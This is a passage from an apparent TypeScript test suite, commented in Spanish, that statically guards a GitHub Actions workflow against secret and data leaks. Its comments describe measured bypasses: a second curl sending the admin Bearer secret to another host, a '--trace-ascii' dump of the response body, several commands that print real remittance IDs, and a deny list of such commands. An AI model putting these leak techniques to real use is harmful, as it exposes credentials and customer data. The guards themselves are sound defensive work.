 *  forma canonica de "bajarle el volumen" a un job cronicamente rojo, y textualmente la tentacion que
 *  el runbook predice— deja **401 / 404 / 501 / 503 en VERDE**; y el mismo mutante sobre el corte de
 *  hallazgos deja el job **aprobando CON hallazgos**. Las aserciones anteriores preguntaban "¿aparece
 *  un `exit 1` en este bloque?" y la pregunta correcta es "¿este `exit 1` se ejecuta cuando la
 *  condicion se cumple?". Un `exit 1` anidado en un `if` que nunca se cumple contesta SI a la primera
 *  y NO a la segunda.
 *
 *  ⚠️ Se cuenta ESTRUCTURA (bloques abiertos) y no SANGRIA a proposito: la sangria de un script dentro
 *  de un block scalar de YAML es reformateable sin cambiar la semantica, y la estructura de bloques no.
 *  Y si el flujo SALE del bloque que contiene a `desde` (profundidad negativa) la busqueda se corta: un
 *  `exit 1` de mas afuera no protege a la anotacion de adentro.
 *
 *  ⚠️ LO QUE NO HACE: no es un parser de bash. Un `if … ; then exit 1 ; fi` escrito TODO en un renglon
 *  cuenta como bloque abierto que nunca cierra, asi que el `exit` de ese renglon no lo ve nadie ⇒ la
 *  anotacion se reporta como sin corte (rojo). Es la direccion segura del error, y en este YAML no hay
 *  ningun `if` de un renglon. */
function corteIncondicional(
  lineas: readonly string[],
  desde: number,
  hasta: number = lineas.length,
): string {
  let profundidad = 0;
  for (let j = desde; j < hasta; j++) {
    const l = lineas[j] as string;
    if (CIERRA_BLOQUE.test(l)) {
      profundidad--;
      if (profundidad < 0) return "";
      continue;
    }
    if (ABRE_BLOQUE.test(l)) {
      profundidad++;
      continue;
    }
    const m = /^\s*exit\s+(\d+)\s*$/.exec(l);
    if (m && profundidad === 0) return m[1] as string;
  }
  return "";
}

/** Las anotaciones `::error` de un `run:` que NO cortan: despues de cada una, y antes de la siguiente,
 *  tiene que haber un `exit 1` **INCONDICIONAL** (ver `corteIncondicional`). Devuelve las que fallan.
 *
 *  🔴 POR QUE ES UN INVARIANTE Y NO UNA LISTA DE LINEAS. Un `::error` sin corte es el peor de los dos
 *  mundos: pinta la anotacion de rojo en la UI de Actions y DEJA EL PASO EN VERDE, asi que parece que
 *  hay senal y el job aprueba. Este workflow tiene SIETE anotaciones con su `exit 1` (las dos de los
 *  `case` de validacion de forma no viven en ningun `if`, asi que ningun `bloqueIf` las alcanza), y
 *  todas sobrevivian al mutante `exit 1 → exit 0` cuando el corte se asserteaba por presencia suelta.
 *  El invariante las cubre a todas de una vez: agregar una anotacion nueva con su `exit 1`
 *  incondicional lo deja verde, y sin el lo pone rojo, sin tocar este archivo.
 *
 *  🔴 SU ALCANCE EXACTO, corregido — la version anterior de este docblock decia que el invariante
 *  "cubre las seis de una vez y NO ENVEJECE", y las dos mitades eran FALSAS: solo valia frente a
 *  cortes INCONDICIONALES (un `exit 1` anidado en un `if` falso lo satisfacia) y el numero seis se
 *  quedaba viejo con la primera anotacion nueva. Una declaracion asi apaga la revision siguiente, que
 *  es peor que no tenerla. Lo que hoy se puede afirmar, y esta medido:
 *    · cubre TODAS las anotaciones del `run:` que se le pase, sin enumerarlas;
 *    · exige que el corte sea incondicional EN SU NIVEL, no que exista en algun lugar del bloque;
 *    · es ASIMETRICO: verifica **anotacion ⇒ corte**, y NADA verifica **corte ⇒ anotacion**. La
 *      asimetria es deliberada y su consecuencia operativa esta declarada en el docblock de arriba y
 *      en el runbook (`docs/runbook-reconcile-orphans.md`, "un rojo sin anotacion"): este job puede
 *      fallar SIN DECIR POR QUE. */
function anotacionesSinCorte(run: string): readonly string[] {
  const lineas = run.split("\n");
  const sueltas: string[] = [];
  for (let i = 0; i < lineas.length; i++) {
    if (!(lineas[i] as string).includes("::error")) continue;
    const titulo = /::error title=([^:]*)/.exec(lineas[i] as string)?.[1] ?? `linea ${i}`;
    const siguiente = lineas.findIndex((l, k) => k > i && l.includes("::error"));
    const corte = corteIncondicional(lineas, i + 1, siguiente === -1 ? lineas.length : siguiente);
    if (corte !== "1") {
      sueltas.push(`${titulo} → ${corte === "" ? "ningun corte incondicional" : `exit ${corte}`}`);
    }
  }
  return sueltas;
}

/** Las URLs de un texto. Se comparte entre la asercion y su sonda de calibracion a proposito: si el
 *  patron y la sonda fueran dos copias, la sonda podria seguir cazando algo que la asercion ya no ve. */
const URL_RE = /https?:\/\/[^\s"'`)]+/g;
function urlsDe(texto: string): readonly string[] {
  return [...texto.matchAll(URL_RE)].map((m) => m[0]);
}

/** Parte una linea de shell en TOKENS respetando las comillas: `-H "authorization: Bearer x"` son DOS
 *  tokens y no cuatro. No es un parser de shell (no entiende escapes ni sustitucion de comandos
 *  anidada); es lo justo para poder correr una LISTA BLANCA sobre el argv de un comando de una linea.
 *  Calibrado en T-042B-15. */
function tokens(cmd: string): readonly string[] {
  const out: string[] = [];
  let actual = "";
  let comilla = "";
  let abierto = false;
  for (const c of cmd) {
    if (comilla !== "") {
      if (c === comilla) comilla = "";
      else actual += c;
      continue;
    }
    if (c === '"' || c === "'") {
      comilla = c;
      abierto = true;
      continue;
    }
    if (/\s/.test(c)) {
      if (actual !== "" || abierto) {
        out.push(actual);
        actual = "";
        abierto = false;
      }
      continue;
    }
    actual += c;
  }
  if (actual !== "" || abierto) out.push(actual);
  return out;
}

/** Una linea que INVOCA `curl`, y no una que lo MENCIONA.
 *
 *  🔴 POR QUE NO ES `/\bcurl\b/` A SECAS, y por que importa en las DOS direcciones. Este mismo workflow
 *  tiene la palabra `curl` dentro del mensaje de un `::error` ("el curl no completo"), asi que un barrido
 *  de toda linea que la mencione daria FALSO ROJO con el workflow CORRECTO — y un falso rojo con el
 *  workflow bien es lo que empuja a alguien a RELAJAR el patron. Asi que se exige POSICION DE COMANDO:
 *  principio de linea, o detras de un `$(`, un backtick, un `|`, un `;`, un `&`, un `(` o un `{`.
 *
 *  ⚠️ EL BORDE, declarado: un mensaje que contenga `; curl` o `(curl` se contaria como invocacion ⇒ falso
 *  ROJO, que es la direccion VISIBLE del error. Y al reves, un `curl` escondido detras de una variable
 *  (`c=curl; $c …`), de un `eval` o de un `sh -c` NO se cuenta: eso es el item 9(b) del perimetro, con su
 *  input medido, y lo cerraria la lista blanca del primer token de cada linea. */
const CURL_INVOCACION = /(?:^|\$\(|[;&|(`{])\s*!?\s*curl\b/;

/** El argv de CADA `curl` que un `run:` invoca, uno por invocacion, con las lineas de continuacion (`\`)
 *  ya unidas y sin el `if ! code="$(` de adelante ni el `)"; then` de atras. Devuelve [] si no hay ninguno.
 *
 *  🔴 POR QUE HACE FALTA EL ARGV Y NO ALCANZA CON REGEX DE PRESENCIA. El AR de la iteracion 2 midio
 *  dos banderas que el candado no podia ver, las dos con 15/15: `--trace-ascii /dev/stdout` volcaba el
 *  intercambio HTTP COMPLETO —cuerpo incluido, o sea los IDs de remesas reales— al log de un repo
 *  publico SIN TOCAR `body.json` (asi que ninguna asercion sobre `body.json` lo alcanzaba); y borrar
 *  `--max-time 60` subia el techo de 60 s a los 5 min del `timeout-minutes`. Tres rondas de lista
 *  negra son la evidencia de que la lista negra no cierra: lo que cierra es enumerar lo PERMITIDO.
 *
 *  🔴 Y POR QUE TODAS LAS INVOCACIONES Y NO LA PRIMERA. Esta funcion usaba `findIndex`, o sea leia SOLO
 *  el primer `curl`, y su nombre en singular ayudaba a no notarlo. Medido por el CR: agregar al paso un
 *  SEGUNDO comando —`curl -sS -X POST -H "authorization: Bearer <la misma env>" "$fuga"`, con el destino
 *  partido en dos literales para que `URL_RE` no lo viera— mandaba el secreto de administracion de
 *  produccion a otro host y pasaba 17/17 EN VERDE. Una lista blanca que corre sobre "el primer curl" no
 *  es una lista blanca: corre sobre CADA UNO. */
function argvsDelCurl(run: string): readonly (readonly string[])[] {
  const lineas = run.split("\n");
  const out: (readonly string[])[] = [];
  for (let i = 0; i < lineas.length; i++) {
    if (!CURL_INVOCACION.test(lineas[i] as string)) continue;
    let texto = lineas[i] as string;
    let j = i;
    while (/\\\s*$/.test(lineas[j] as string) && j + 1 < lineas.length) {
      j++;
      texto = `${texto.replace(/\\\s*$/, "")} ${(lineas[j] as string).trim()}`;
    }
    const desde = texto.indexOf("curl");
    const cierre = texto.lastIndexOf(')"');
    out.push(tokens(cierre > desde ? texto.slice(desde, cierre) : texto.slice(desde)));
    i = j;
  }
  return out;
}

/** El `cron:` del YAML es la FUENTE UNICA de la cadencia. No se hardcodea en este archivo a
 *  proposito: si estuviera escrito aca, cambiar el cron y la prosa de forma coordinada pero errada
 *  dejaria este candado en verde comparando dos copias de lo mismo. */
const CRON = YAML.match(/^\s*-\s*cron:\s*['"]([^'"]+)['"]/m)?.[1] ?? "";

/** Las 6 capitalizaciones de la negacion, igual que prepared-claims-guard.static.test.ts: cubrir
 *  solo la minuscula ya dejo pasar `principal NO entro` una vez en este repo. */
const NEGACIONES = ["NUNCA", "Nunca", "nunca", "NO", "No", "no"] as const;
const CLAIM_RE = new RegExp(`principal[^.;]{0,60}?(${NEGACIONES.join("|")})\\s+entr`, "g");

describe("WKH-328B — candado estatico del workflow que invoca reconcile-orphans", () => {
  // ── T-042B-0 · CD-8 — ANTI-VACIO Y ANTI-ESTRUCTURA-ROTA, VA PRIMERO ─────────────────────────
  // Sin esto, borrar el workflow dejaria a los demas assertando sobre la cadena vacia, y varios de
  // ellos (los que exigen NO encontrar algo) pasarian en verde. Un guard que no encuentra nada
  // aplaude.
  it("T-042B-0: el workflow existe, se llama reconcile-orphans y tiene UN job con DOS pasos con cuerpo", () => {
    expect(existsSync(path.join(ROOT, WORKFLOW_REL)), `falta ${WORKFLOW_REL}`).toBe(true);
    expect(YAML.split("\n").length).toBeGreaterThan(25);
    expect(YAML.match(/^name:\s*(.+)$/m)?.[1]?.trim()).toBe("reconcile-orphans");
    // 🔴 ESTRUCTURA, NO TEXTO. `jobs:` tiene que existir como clave de PRIMER NIVEL. Medido: con el
    // barrido de texto anterior, renombrarla a `jobss:` pasaba 15/15 — y un workflow sin clave `jobs`
    // GitHub no lo registra, asi que no corre NUNCA. Es el mismo modo de falla que esta HU vino a
    // arreglar ("el archivo declara la intencion y nadie inscribio el schedule"), pero disfrazado de
    // suite verde.
    expect(JOBS, "no hay una clave `jobs:` de primer nivel con jobs adentro").toHaveLength(1);
    expect(CODIGO.length, "el bloque `jobs:` esta vacio").toBeGreaterThan(500);
    // Los dos pasos, con `- name:` y con cuerpo `run:`.
    expect(PASOS).toHaveLength(2);
    for (const [i, p] of PASOS.entries()) {
      expect(p.nombre, `el paso ${i} no tiene \`- name:\``).not.toBe("");
      expect(p.run.length, `el paso ${i} (${p.nombre}) no tiene cuerpo \`run:\``).toBeGreaterThan(100);
    }
    // ⚠️ CALIBRACION DEL LECTOR, EN LAS DOS DIRECCIONES. Un lector estructural escrito a mano puede
    // fabricar su propio bug, y entonces todo lo que cuelga de el aplaude. Asi que se prueba que
    // encuentre lo que tiene que encontrar Y que devuelva "" cuando la ruta NO esta.
    expect(bloqueAnidado(YAML, ["jobs", JOB, "steps"])).not.toBe("");
    expect(bloqueAnidado(YAML, ["jobs", JOB, "clave-que-no-existe"])).toBe("");
    expect(bloqueAnidado("jobss:\n  reconcile:\n    steps:\n      - name: x\n", ["jobs", "reconcile", "steps"])).toBe("");
    expect(bloqueAnidado("jobs:\n  reconcile:\n    steps:\n      - name: x\n", ["jobs", "reconcile", "steps"])).toBe("      - name: x");
  });

  // ── AC-B1 — hay un productor programado ─────────────────────────────────────────────────────
  it("T-042B-1: el `on:` tiene un `schedule:` con una expresion cron", () => {
    const on = bloqueAnidado(YAML, ["on"]);
    expect(on, "no se encontro el bloque `on:`").not.toBe("");
    expect(on).toMatch(/^\s+schedule:/m);
    // 5 campos separados por espacios: es lo que hace que esto dispare solo.
    expect(CRON.trim().split(/\s+/)).toHaveLength(5);
  });

  it("T-042B-2: el `on:` tiene EXACTAMENTE schedule + workflow_dispatch (ni push ni pull_request)", () => {
    const on = bloqueAnidado(YAML, ["on"]);
    const claves = [...on.matchAll(/^ {2}([a-z_]+):/gm)].map((m) => m[1]);
    // Ordenado para no depender del orden de escritura.
    expect([...claves].sort()).toEqual(["schedule", "workflow_dispatch"]);
    // GitHub no expone secretos a workflows de `pull_request` desde un fork; al no tener el trigger,
    // ni siquiera existe la superficie.
    expect(claves).not.toContain("pull_request");
    expect(claves).not.toContain("push");
  });

  // ── AC-B2 — el mismo mecanismo de auth que el endpoint ya exige ──────────────────────────────
  it("T-042B-3: el secreto viaja en un header `authorization: Bearer`, alimentado por secrets.RECONCILE_ADMIN_SECRET", () => {
    expect(L1).toMatch(/-H\s+"authorization:\s*Bearer\s+\$\{RECONCILE_ADMIN_SECRET\}"/);
    // Y llega por `env:`, no interpolado dentro del `run:`. Se mide sobre el paso COMPLETO (el
    // `env:` no vive dentro del `run:`) y sin comentarios.
    expect(PASOS[0]?.crudo ?? "").toMatch(
      /RECONCILE_ADMIN_SECRET:\s*\$\{\{\s*secrets\.RECONCILE_ADMIN_SECRET\s*\}\}/,
    );
  });

  it("T-042B-4: despues de `Bearer ` solo hay una expansion, cero literales", () => {
    // ⚠️ Sobre CODIGO (sin comentarios), no sobre el YAML crudo: medido, un comentario del estilo
    // `# CONTRAEJEMPLO PROHIBIDO: nunca -H "authorization: Bearer sk-live-EJEMPLO"` ponia este test
    // ROJO con el workflow CORRECTO, y escribir ese comentario es la evolucion natural de un archivo
    // cuyo estilo es explicar sus propias prohibiciones. El riesgo no es el rojo: es que alguien con
    // la suite roja y el workflow bien relaje el patron, y el falso rojo se vuelva falso verde.
    const usos = [...CODIGO.matchAll(/Bearer\s+([^"'\n]+)/g)].map((m) => (m[1] as string).trim());
    expect(usos.length, "no aparece ningun `Bearer ` en el codigo del workflow").toBeGreaterThan(0);
    for (const u of usos) {
      // `${VAR}` (env del paso) o `${{ secrets.X }}` (expresion de Actions). Nada mas.
      expect(u, `secreto en texto plano despues de Bearer: ${u}`).toMatch(/^\$\{\{?[^}]*\}?\}$/);
    }
  });

  // ── AC-B3 — el secreto NUNCA en la URL ──────────────────────────────────────────────────────
  it("T-042B-5: la URL del curl es un LITERAL: ni expansion, ni query-string", () => {
    // 🔴 LISTA BLANCA, NO LISTA NEGRA. La version anterior prohibia `secrets.`, `${` y cuatro
    // literales (`?secret=`, `&secret=`, `?token=`, `&token=`). Medido: `?s=$RECONCILE_ADMIN_SECRET`
    // —sin llaves, que en bash expande igual, y con un nombre de parametro que no estaba en la lista de
    // cuatro— pasaba 15/15, y el secreto viajaba en la query-string. GitHub enmascara el secreto en el
    // log de Actions, asi que ese agujero NO se veria por ahi: se veria en los logs de Vercel, del CDN
    // y de cualquier proxy, que es donde no hay candado. Enumerar grafias prohibidas no cierra: lo que
    // cierra es exigir que la URL sea un literal.
    // Y sobre L1 (el `run:` sin comentarios), no sobre el YAML crudo: el docblock del workflow nombra
    // la misma URL para explicar contra que se pega.
    const urls = urlsDe(L1);
    expect(urls, "el paso L1 no tiene ninguna URL").not.toEqual([]);
    for (const u of urls) {
      expect(u, `URL con expansion (shell o Actions): ${u}`).not.toMatch(/\$/);
      expect(u, `URL con query-string, que queda escrita en logs de proxies y del CDN: ${u}`).not.toMatch(/[?&]/);
      expect(u, `URL con expansion de secretos: ${u}`).not.toMatch(/secrets\./);
    }
    // Control de no-vacuidad del patron: si `URL_RE` dejara de capturar la parte peligrosa, los tres
    // `not.toMatch` de arriba pasarian sobre una cadena inofensiva y no dirian nada.
    const sonda = urlsDe('curl "https://ejemplo.test/api/x?s=$RECONCILE_ADMIN_SECRET")');
    expect(sonda).toHaveLength(1);
    expect(sonda[0]).toMatch(/\$/);
    expect(sonda[0]).toMatch(/[?&]/);
  });

  // ── AC-B4 — no-regresion: esta HU es WIRING, no rediseno del endpoint ───────────────────────
  it("T-042B-6: route.ts sigue exportando SOLO POST", () => {
    expect(ROUTE, `falta ${ROUTE_REL}`).not.toBe("");
    const verbos = [...ROUTE.matchAll(/export\s+async\s+function\s+([A-Z]+)/g)].map((m) => m[1]);
    expect(verbos).toEqual(["POST"]);
    // Agregar GET es justo lo que exigiria Vercel Cron, y le daria semantica de lectura a una
    // operacion que MUTA.
    for (const v of ["GET", "PUT", "PATCH", "DELETE", "HEAD"]) expect(verbos).not.toContain(v);
  });

  it("T-042B-7: route.ts sigue con UNA sola llamada a markOutcome y CERO a fetch", () => {
    expect(ROUTE).not.toBe("");
    expect([...ROUTE.matchAll(/markOutcome\(/g)]).toHaveLength(1);
    // Cero fetch es lo que vuelve el doble-pago imposible por construccion.
    expect([...ROUTE.matchAll(/\bfetch\(/g)]).toHaveLength(0);
  });

  // ── AC-B5 — las dos capas fallan de verdad ──────────────────────────────────────────────────
  it("T-042B-8: L1 valida el secreto vacio, compara el status contra 200, y cada rojo CORTA", () => {
    // ⚠️ L1 ya viene del `run:` estructural y SIN COMENTARIOS, asi que todas las aserciones de este
    // test miran codigo. No es un detalle de estilo, son dos bugs medidos en la primera entrega:
    //   · el comentario que explica este mismo chequeo dice "ANTES del curl", asi que sobre el texto
    //     crudo `curl` aparecia 233 caracteres ANTES del `-z` y la comparacion de orden daba ROJO con
    //     el workflow CORRECTO;
    //   · y en la direccion peligrosa, el comentario `# -o body.json ⇒ …` SATISFACIA por si solo la
    //     asercion del `-o`, asi que borrar el `-o` del curl pasaba 15/15 — y sin `-o` el body entero
    //     (con remittanceId / quoteId / payoutId de remesas REALES) se captura en `code` y el YAML lo
    //     imprime en el `::error` y en el `$GITHUB_STEP_SUMMARY` de un repo PUBLICO.
    expect(L1).toMatch(/set -euo pipefail/);
    expect(L1).toMatch(/-z\s+"\$\{RECONCILE_ADMIN_SECRET\}"/);
    // 🔴 EL ORDEN, POR LINEA Y CON `CURL_INVOCACION` — ya no con `indexOf("curl")` sobre el texto. La
    // guarda HERMANA (la de host, en T-042B-15) se arreglo asi una ronda antes y esta se habia quedado
    // con el `indexOf` crudo. El precio lo midio el F4 y se re-midio en este fix-pack, con el mismo
    // numero: agregar al `run:` un
    // `echo "diagnostico: si el curl falla, mira el runbook"` —una edicion legitima, y NO un comentario,
    // asi que `sinComentarios` no la borra— ponia este test ROJO con el workflow CORRECTO
    // (`expected 107 to be less than 63`), porque el `indexOf("curl")` se anclaba en la palabra del
    // mensaje y no en la invocacion. Un falso rojo con el workflow bien es lo que empuja al siguiente a
    // RELAJAR el patron, que es como se pierde un candado.
    const lineasDeL1 = L1.split("\n");
    const iSecretoVacio = lineasDeL1.findIndex((l) => /-z\s+"\$\{RECONCILE_ADMIN_SECRET\}"/.test(l));
    const iInvocacionCurl = lineasDeL1.findIndex((l) => CURL_INVOCACION.test(l));
    expect(iSecretoVacio, "no se encontro el chequeo de secreto vacio en ninguna linea de L1").toBeGreaterThan(-1);
    expect(iInvocacionCurl, "no se encontro ninguna INVOCACION de curl en L1").toBeGreaterThan(-1);
    expect(
      iSecretoVacio,
      "el chequeo de secreto vacio corre DESPUES del curl: para cuando avisa, el POST ya salio",
    ).toBeLessThan(iInvocacionCurl);
    expect(L1).toMatch(/%\{http_code\}/);
    expect(L1).toMatch(/!=\s*"200"/);
    expect(L1).toMatch(/-o\s+body\.json/);
    // 🔴 CADA GUARDA CON SU `exit 1` INCONDICIONAL DENTRO DE SU PROPIO `if`, no suelto en el paso y no
    // anidado en otra condicion. Dos agujeros medidos, en dos rondas distintas:
    //   · con `expect(L1).toMatch(/exit 1/)` bastaba que quedara UNO de los tres `exit 1` del paso, asi
    //     que voltear a `exit 0` el del chequeo de status —un 401 en VERDE— pasaba 15/15;
    //   · y con el corte asserteado por PRESENCIA dentro del bloque, envolverlo en
    //     `if [ "$SILENCIAR" = "si" ]; then exit 1; fi` volvia a dejar el 401 en VERDE con 2801/2801.
    //     Por eso se usa `corteIncondicional` y no un `toMatch(/^\s*exit 1$/m)`.
    const guardas = [
      ["el secreto esta vacio", /-z\s+"\$\{RECONCILE_ADMIN_SECRET\}"/],
      ["el destino no es el host permitido", /"\$\{host\}"\s*!=\s*"\$\{HOST_PERMITIDO\}"/],
      ["el curl no completa", /curl/],
      ['el status no es "200"', /!=\s*"200"/],
    ] as const;
    for (const [etiqueta, condicion] of guardas) {
      const bloque = bloqueIf(L1, condicion);
      expect(bloque, `L1 no tiene un \`if\` para: ${etiqueta}`).not.toBe("");
      expect(
        corteIncondicional(bloque.split("\n"), 1),
        `el \`if\` de "${etiqueta}" no corta con un exit 1 INCONDICIONAL en su nivel`,
      ).toBe("1");
    }
    // ⚠️ CALIBRACION DE `bloqueIf`, EN LAS DOS DIRECCIONES: que encuentre el corte cuando esta DENTRO
    // del bloque, y que NO lo vea cuando esta afuera. Sin esta sonda, un extractor con un bug propio
    // (devolver el `run:` entero, por ejemplo) haria que las tres guardas de arriba aplaudan.
    // (La sonda usa `$x` y no `${x}` a proposito: escrito con llaves, biome lo marca con
    // lint/suspicious/noTemplateCurlyInString. Es la misma razon por la que el literal prohibido de
    // T-042B-10 esta partido en dos. Lo que la sonda ejercita es la condicion, no la sintaxis de la var.)
    expect(bloqueIf('if [ "$x" != "200" ]; then\n  exit 1\nfi', /!=\s*"200"/)).toMatch(/exit 1/);
    expect(bloqueIf('if [ "$x" != "200" ]; then\n  echo hola\nfi\nexit 1', /!=\s*"200"/)).not.toMatch(
      /exit 1/,
    );
    // ⚠️ Y LA CALIBRACION DEL DETECTOR DE CORTES, que es el arreglo de esta ronda: el mismo bloque con
    // el `exit 1` suelto y con el `exit 1` anidado en un `if` que puede no cumplirse. El segundo es el
    // mutante que sobrevivia con 2801/2801, y aca queda ejercitado en la direccion negativa.
    expect(corteIncondicional('if [ "$x" != "200" ]; then\n  exit 1\nfi'.split("\n"), 1)).toBe("1");
    expect(
      corteIncondicional(
        'if [ "$x" != "200" ]; then\n  if [ "$s" = "si" ]; then\n    exit 1\n  fi\nfi'.split("\n"),
        1,
      ),
      "un exit 1 anidado en otro `if` NO es un corte incondicional",
    ).toBe("");
    // Y ninguna anotacion queda sin corte: un `::error` sin `exit 1` pinta rojo y aprueba el paso.
    expect(anotacionesSinCorte(L1)).toEqual([]);
    expect(L1, "L1 tiene un `exit 0` explicito: un corte que no corta").not.toMatch(/^\s*exit 0\s*$/m);
  });

  it("T-042B-9: L2 valida la forma, compara los TRES contadores, y cada rojo CORTA", () => {
    // 🔴 Las tres comparaciones tienen que estar EN EL MISMO `if` que corta, no repartidas por el
    // paso: una comparacion que vive fuera del `if` no produce ningun rojo.
    const ifHallazgos = bloqueIf(L2, /-gt 0/);
    expect(ifHallazgos, "L2 no tiene un `if` que compare los contadores").not.toBe("");
    for (const v of ["prepared_total", "failed", "manual_review"]) {
      expect(ifHallazgos, `falta la comparacion de ${v} en el \`if\` de hallazgos`).toMatch(
        new RegExp(`\\$\\{${v}\\}"\\s+-gt 0`),
      );
    }
    // Medido: con `expect(L2).toMatch(/exit 1/)` suelto, voltear este corte a `exit 0` —hay hallazgos
    // y el job sale VERDE— pasaba 15/15, porque los `exit 1` de la validacion de forma seguian
    // escritos. Y es la mutacion que el runbook predice como tentacion humana con L2 cronicamente
    // roja (`docs/runbook-reconcile-orphans.md`: "la decision no es bajarle el volumen").
    // Y el corte tiene que ser INCONDICIONAL: envolverlo en `if [ "$SILENCIAR" = "si" ]; then …` deja
    // el job APROBANDO CON HALLAZGOS, y sobrevivia con 2801/2801 mientras esto era un `toMatch`.
    expect(
      corteIncondicional(ifHallazgos.split("\n"), 1),
      "el `if` de hallazgos no corta con un exit 1 INCONDICIONAL en su nivel",
    ).toBe("1");
    // Simetria con L1 (era una asimetria sin razon escrita): borrar `set -euo pipefail` de L2 dejaba el
    // paso sin `set -e`, o sea que un `jq` que falla no cortaria por si solo.
    expect(L2, "L2 no tiene `set -euo pipefail`").toMatch(/set -euo pipefail/);
    // ⚠️ `truncated` es un BOOLEANO (en el endpoint sale de comparar el total contra el largo de la
    // pagina), asi que se valida como true/false. Si se le aplicara la validacion de entero de los
    // otros cuatro campos, este paso quedaria ROJO SIEMPRE.
    expect(L2).toMatch(/true\s*\|\s*false\)/);
    expect(L2).not.toMatch(/\$\{prepared_truncated\}"\s+-gt/);
    // Y el resumen se escribe siempre, en verde y en rojo.
    expect(L2).toMatch(/GITHUB_STEP_SUMMARY/);
    // 🔴 Los otros dos cortes de L2 (la validacion de forma de los cuatro enteros, y la de
    // `truncated`) viven en `case`, no en un `if`, asi que ningun `bloqueIf` los alcanza. Los cubre el
    // invariante de las anotaciones. Medi los dos mutantes en el fix-pack: los dos sobrevivian.
    expect(anotacionesSinCorte(L2)).toEqual([]);
    expect(L2, "L2 tiene un `exit 0` explicito: un corte que no corta").not.toMatch(/^\s*exit 0\s*$/m);
    // ⚠️ CALIBRACION DEL INVARIANTE, EN LAS DOS DIRECCIONES: verde con el par correcto, rojo con el
    // `exit 0` y rojo con la anotacion que no corta nada.
    expect(anotacionesSinCorte('echo "::error title=x::y"\nexit 1')).toEqual([]);
    expect(anotacionesSinCorte('echo "::error title=x::y"\nexit 0')).toHaveLength(1);
    expect(anotacionesSinCorte('echo "::error title=x::y"\necho fin')).toHaveLength(1);
    // Y el mutante de esta ronda: la anotacion con su `exit 1` PERO anidado en un `if` que puede no
    // cumplirse. Con el detector anterior daba `[]` (verde) y el 401 salia verde.
    expect(
      anotacionesSinCorte('echo "::error title=x::y"\nif [ "$s" = "si" ]; then\n  exit 1\nfi'),
      "un exit 1 anidado en un `if` que puede no cumplirse NO alcanza como corte",
    ).toHaveLength(1);
    // Y el grupo de llaves NO es una condicion: el corte que viene despues de un `{ … } >> resumen`
    // (que es la forma exacta del chequeo de status) tiene que seguir contando como incondicional.
    expect(
      anotacionesSinCorte('echo "::error title=x::y"\n{\n  echo linea\n} >> "$RESUMEN"\nexit 1'),
      "un grupo `{ … }` no condiciona nada y no puede invalidar el corte",
    ).toEqual([]);
  });

  // ── AC-B6 · CD-10 — los logs de un repo PUBLICO son publicos ────────────────────────────────
  it("T-042B-10: el workflow no ecoa el body ni los IDs de correlacion", () => {
    // El array de items lleva remittanceId / quoteId / payoutId de remesas REALES.
    // ⚠️ Sobre SHELL (los `run:`, sin comentarios de linea completa NI en linea) y no sobre el YAML
    // crudo ni sobre `CODIGO`. Tres falsos rojos medidos, uno por ronda, todos con el workflow CORRECTO:
    //   · un comentario de linea completa que NOMBRE la prohibicion
    //     (`# CONTRAEJEMPLO PROHIBIDO: nunca \`cat body.json\``);
    //   · un comentario EN LINEA (`  # nunca cat body.json` al final de un `echo`);
    //   · y el `name:` de un paso que contenga la palabra `jq`, que es CONFIGURACION y por lo tanto
    //     ningun despojador de comentarios lo saca. Ver el docblock de `SHELL`.
    const prohibidos = [
      "cat body.json",
      'cat "body.json"',
      "jq . body.json",
      "jq '.' body.json",
      'jq "." body.json',
      ".items",
      "$(cat body",
      "echo $body",
      // Partido en dos a proposito: escrito de corrido, biome lo marca con
      // lint/suspicious/noTemplateCurlyInString (cree que es un template literal mal escrito).
      // Un guard tiene que NOMBRAR el literal que prohibe, asi que se lo nombra sin ensuciar el lint.
      `$${"{body}"}`,
    ];
    for (const p of prohibidos) {
      expect(SHELL.includes(p), `el workflow imprimiria datos de remesas reales: ${p}`).toBe(false);
    }
    // 🔴 Y LA LISTA BLANCA, que es la que cierra el agujero de verdad. Una lista negra no puede
    // enumerar todas las formas de imprimir el array: medido, agregar la linea
    // `echo "detalle: $(jq -c '.preparedOrphans' body.json)"` —que publica remittanceId, quoteId y
    // payoutId de remesas REALES en el log de un repo publico— no matchea ninguno de los nueve
    // literales de arriba y pasaba 15/15. Asi que se assertan las lecturas PERMITIDAS: toda linea del
    // codigo que invoque `jq` tiene que ser una lectura de UNO de los cinco agregados a una variable,
    // y cualquier otra forma es roja.
    const AGREGADOS = [
      ".scanned",
      ".manualReview",
      ".failed",
      ".preparedOrphans.total",
      ".preparedOrphans.truncated",
    ] as const;
    const LECTURA_PERMITIDA = /^\s*[a-z_]+="\$\(jq -r '(\.[A-Za-z.]+)' body\.json\)"$/;
    const lineasJq = SHELL.split("\n").filter((l) => /\bjq\b/.test(l));
    expect(lineasJq, "el codigo del workflow no invoca `jq` en ninguna linea").not.toEqual([]);
    const leidos: string[] = [];
    for (const l of lineasJq) {
      const m = LECTURA_PERMITIDA.exec(l);
      expect(m, `linea con \`jq\` que no es la lectura de un agregado a una variable: ${l.trim()}`).not.toBeNull();
      leidos.push((m?.[1] as string) ?? l.trim());
    }
    expect([...leidos].sort()).toEqual([...AGREGADOS].sort());
    // ⚠️ LO QUE ESTA LISTA BLANCA NO CUBRE, declarado y con los inputs concretos medidos: cubre `jq`,
    // no cualquier otra forma de leer `body.json`. Siguen pasando en verde, y los seis publicarian IDs
    // de remesas reales en un repo publico:
    //   · `head -c 300 body.json` a stdout, y `head -20 body.json >> "$GITHUB_STEP_SUMMARY"`;
    //   · `echo "detalle: $(cat < body.json)"`;
    //   · `while IFS= read -r l; do echo "$l"; done < body.json`;
    //   · `python3 -c "…['items']…"`;
    //   · `set -x`, que ecoa el comando y no el archivo.
    // El eje de las BANDERAS de `curl` —`--trace-ascii /dev/stdout`, que volcaba el cuerpo al log sin
    // tocar `body.json`— NO esta en esta lista: lo cierra la lista blanca del argv en T-042B-15. Si
    // algun dia se cierran estos seis, el instrumento es el mismo: lista blanca de los comandos del
    // `run:`, no lista negra de literales. Ver el PERIMETRO en el encabezado de este archivo.
  });

  // ── AC-B7 — solapamiento y cota de duracion ─────────────────────────────────────────────────
  it("T-042B-11: hay concurrency (sin cancelar la corrida en curso) y un timeout", () => {
    const c = bloqueAnidado(YAML, ["concurrency"]);
    expect(c, "no se encontro el bloque `concurrency:`").not.toBe("");
    expect(c).toMatch(/^\s+group:\s*\S+/m);
    // `false` y no `true`: cancelar la corrida en curso dejaria el batch a la mitad. Sin concurrency,
    // dos corridas solapadas doble-incrementan `attempts` sobre la misma fila.
    expect(c).toMatch(/cancel-in-progress:\s*false/);
